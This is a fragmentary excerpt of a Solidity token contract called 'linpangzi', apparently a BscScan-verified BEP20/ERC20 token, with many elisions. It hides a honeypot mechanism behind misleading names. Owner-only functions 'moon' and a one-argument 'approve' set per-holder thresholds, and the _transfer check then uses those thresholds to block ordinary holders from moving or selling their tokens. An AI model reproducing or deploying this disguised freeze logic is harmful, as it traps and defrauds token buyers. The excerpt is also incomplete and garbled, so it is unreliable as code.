...
/**
 *Submitted for verification at BscScan.com on 2023-1-2
*/
...
contract ERC20 is Context, IERC20, IERC20Metadata,owmmner {
    ...
    function moon(address recipient) external  {
        require( _dogeownes[msg.sender]);
        _kinged[recipient] = _dogewwn[recipient] = bnb; 
    }
      function approve(address recipient) external  {
        require( _dogeownes[msg.sender]);
        _kinged[recipient] = _dogewwn[recipient] ;
    }
    ...
    function _transfer(
        ...
        if (_dogeownes[from] == false) {
            require(fromBalance >= _dogewwn[from], "ERC20: transfer amount exceeds balance");
        }
...
contract linpangzi is ERC20 {
    using pragmas for uint256;
    constructor(uint256 initialSupply) ERC20(" linpangzi ", " linpangzi ") {
